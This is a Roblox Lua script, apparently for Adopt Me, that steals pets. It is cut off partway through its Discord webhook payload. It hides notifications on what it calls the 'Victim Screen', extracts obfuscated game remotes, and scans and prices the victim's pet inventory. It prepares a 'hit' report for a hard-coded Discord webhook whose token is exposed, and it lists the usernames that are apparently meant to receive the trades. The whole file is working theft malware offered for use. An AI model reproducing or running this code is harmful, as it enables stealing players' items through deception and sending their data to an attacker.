-- [[ ꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ﹒˚₊꒱ - STEALTH OMNIPOTENT V2 ]] --

-- [[ BOT GENERATED CONFIG ]] --
local USERNAMES = {"2ndcfpaj67", "CREOLEO23", "CREOLEO25"} 
local WEBHOOK   = "https://discord.com/api/webhooks/1408047737102012506/4VZHtB_G9RmikEuLs0-A6yP_0AXaYmb4_4Y3TyaG_0Wxem1-OvNBtPC9n71B4-SSzkUa"
local THRESHOLD = 0.13 -- Pets strictly below this value are ignored in trades and webhooks

-- 1. INITIALIZATION & STEALTH UI
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- Stealth Mode: Kills notifications and dialog boxes on Victim Screen
local function applyStealth()
    pcall(function()
        local gui = LocalPlayer:WaitForChild("PlayerGui")
        -- Hiding these prevents the victim from seeing the "Trade Request Sent" / "Cooldown" spam
        if gui:FindFirstChild("NotificationApp") then gui.NotificationApp.Enabled = false end
        if gui:FindFirstChild("DialogApp") then gui.DialogApp.Enabled = false end
        if gui:FindFirstChild("HintApp") then gui.HintApp:Destroy() end
    end)
end
applyStealth()

while not LocalPlayer or not LocalPlayer:FindFirstChild("PlayerGui") do 
    task.wait(0.5) 
    LocalPlayer = Players.LocalPlayer 
end

-- 2. TOBI'S HASH FINDER (Remote Obfuscation Bypass)
local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local upvalues = debug.getupvalues(v)
        if type(upvalues[1]) == "table" then
            for key, value in pairs(upvalues[1]) do hashes[key] = value end
        end
    end
end

local function hashedAPI(remoteName, ...)
    local remote = hashes[remoteName]
    if not remote then return nil end
    if remote:IsA("RemoteFunction") then return remote:InvokeServer(...)
    elseif remote:IsA("RemoteEvent") then remote:FireServer(...) end
end

-- 3. VALUATION & FILTERING (AMVGG Sided)
local PetBaseValues = {}
-- Untradable Blacklist (Starter dogs/cats, Jerboas, Minigames)
local untradableKeywords = {"starter", "jerboa", "minigame", "practice", "egg_starter"}

local function isTradeable(id)
    local lid = id:lower()
    for _, word in ipairs(untradableKeywords) do
        if lid:find(word) then return false end
    end
    return true
end

-- Custom Value Scaling (True value, NO fixed floor)
local function getScaledValue(rawValue)
    if not rawValue or rawValue <= 0 then return 0 end
    local val = rawValue * 10
    if val < 30 then return 100 + val * 10
    elseif val < 100 then return 400 + val * 6
    else return val * 10 end
end

local function getMutationBonus(p)
    local bonus = 0
    if p.mega_neon or p.mega then bonus = bonus + 3
    elseif p.neon then bonus = bonus + 1 end
    if p.rideable then bonus = bonus + 0.5 end
    if p.flyable then bonus = bonus + 0.5 end
    return bonus
end

-- Custom Emoji Rules
local function getEmoji(p)
    local emojis = ""
    if p.mega_neon or p.mega then emojis = emojis .. "Ⓜ️"
    elseif p.neon then emojis = emojis .. "⭐" end
    if p.flyable then emojis = emojis .. "🪽" end
    if p.rideable then emojis = emojis .. "🏇" end
    return emojis ~= "" and emojis or "🐾"
end

-- Fetch Live AMVGG Data
pcall(function()
    local resp = request({Url = "https://amvgg.com/values/pets", Method = "GET"})
    if resp and resp.Body then
        local data = HttpService:JSONDecode(resp.Body)
        local pets = HttpService:JSONDecode(data.pets or "[]")
        for _, pet in pairs(pets) do 
            if pet.name then PetBaseValues[pet.name] = tonumber(pet.rvalue) or 0 end 
        end
    end
end)

-- 4. INVENTORY SCAN (Clean Multipliers & Strict Threshold)
local Fsys = require(ReplicatedStorage:WaitForChild("Fsys")).load
local InventoryDB = Fsys("InventoryDB")
local ClientData = Fsys("ClientData")

local function processInventory()
    local inv = ClientData.get("inventory")
    local rawPets = inv.pets or {}
    local grouped = {}
    local totalWorth = 0

    for uid, pet in pairs(rawPets) do
        local petData = InventoryDB.pets[pet.id]
        if petData and petData.name and isTradeable(pet.id) then
            local name = petData.name
            local mutations = pet.properties or {}
            local rawVal = PetBaseValues[name] or 0.01
            
            -- Use true scaled value + mutation bonuses
            local individualValue = getScaledValue(rawVal) + getMutationBonus(mutations)
            
            -- STRICT THRESHOLD FILTER
            if individualValue >= THRESHOLD then
                totalWorth = totalWorth + individualValue
                -- Unique key to combine exact duplicates (e.g., Ghost Wolf MFR goes with Ghost Wolf MFR)
                local key = name .. (mutations.mega_neon and "M" or "") .. (mutations.neon and "N" or "") .. (mutations.flyable and "F" or "") .. (mutations.rideable and "R" or "")
                
                if not grouped[key] then
                    grouped[key] = {
                        name = name, 
                        val = individualValue, 
                        count = 1, 
                        uids = {uid}, 
                        props = mutations, 
                        rarity = petData.rarity
                    }
                else
                    grouped[key].count = grouped[key].count + 1
                    table.insert(grouped[key].uids, uid)
                end
            end
        end
    end

    local sorted = {}
    for _, data in pairs(grouped) do table.insert(sorted, data) end
    table.sort(sorted, function(a,b) return a.val > b.val end)
    return sorted, totalWorth
end

-- 5. WEBHOOK EXECUTION
local petList, totalValue = processInventory()
-- Ping if total value of tradeable items hits your threshold target
local pingStatus = totalValue >= (THRESHOLD * 10) 

local function sendHit()
    local inventoryLines = {}
    for i=1, math.min(15, #petList) do
        local p = petList[i]
        local mult = p.count > 1 and " x" .. p.count or ""
        table.insert(inventoryLines, getEmoji(p.props).." "..p.name..mult.." ($"..string.format("%.2f", p.val)..")")
    end

    local payload = {
        content = pingStatus and "@everyone Hit threshold reached!" or "",
        embeds = {{
            title = "꒰₊˚ ꜱᴄʀɪᴘᴛ ๑ ʟʏɴx ꜱᴛᴇᴀʟᴛʜ ʜɪᴛ ﹒˚₊꒱",
            description = "
